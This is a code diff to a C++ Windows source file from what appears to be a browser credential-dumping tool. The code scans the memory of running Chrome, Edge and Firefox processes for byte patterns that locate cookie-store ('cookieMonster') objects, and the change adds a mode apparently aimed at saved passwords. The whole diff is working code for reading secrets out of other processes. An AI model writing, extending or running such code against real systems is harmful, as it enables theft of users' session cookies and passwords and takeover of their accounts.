@@ -2,6 +2,7 @@
 #include "Helper.h"
 #include "Memory.h"
 
+
 BOOL FindLargestSection(HANDLE hProcess, uintptr_t moduleAddr, uintptr_t& resultAddress) {
 
     MEMORY_BASIC_INFORMATION memoryInfo;
@@ -52,16 +53,23 @@ BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {
     return TRUE;
 }
 
-BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress, BOOL isBrowser) {
+BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress, AppLication targetApp, AppMode mode) {
 
     BYTE* newPattern = (BYTE*)malloc(sizeof(BYTE) * patternSize);
     for (size_t i = 0; i < patternSize; i++)
         newPattern[i] = pattern[i];
-
-    if (isBrowser) {
-        BYTE baseAddrPattern[sizeof(uintptr_t)];
-        ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));
-        if (patternSize == 192) {
+    BYTE baseAddrPattern[sizeof(uintptr_t)];
+    ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));
+    if (targetApp == Chrome or targetApp == Edge) {
+        if (mode == Pass) {
+            PatchPattern(newPattern, baseAddrPattern, 16);
+            PatchPattern(newPattern, baseAddrPattern, 40);
+            PatchPattern(newPattern, baseAddrPattern, 48);
+            PatchPattern(newPattern, baseAddrPattern, 56);
+            PatchPattern(newPattern, baseAddrPattern, 64);
+        }
+        else
+        {
             PatchPattern(newPattern, baseAddrPattern, 16);
             PatchPattern(newPattern, baseAddrPattern, 24);
             PatchPattern(newPattern, baseAddrPattern, 56);
@@ -71,16 +79,16 @@ BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAd
             PatchPattern(newPattern, baseAddrPattern, 176);
             PatchPattern(newPattern, baseAddrPattern, 184);
         }
-        else
-        {
-            PatchPattern(newPattern, baseAddrPattern, 8);
-            PatchPattern(newPattern, baseAddrPattern, 88);
-        }
     }
+    if (targetApp == FireFox) {
+        PatchPattern(newPattern, baseAddrPattern, 8);
+        PatchPattern(newPattern, baseAddrPattern, 88);
+    }
+
     return newPattern;
 }
 
-BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster, BOOL isBrowser) {
+BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster, AppLication targetApp, AppMode mode) {
 
     SYSTEM_INFO systemInfo;
     GetSystemInfo(&systemInfo);
@@ -95,7 +103,7 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
             if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {
                 BYTE* buffer = new BYTE[memoryInfo.RegionSize];
                 SIZE_T bytesRead;
-                BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress), isBrowser);
+                BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress), targetApp, mode);
                 if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                     uintptr_t baseAddr = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
                     for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
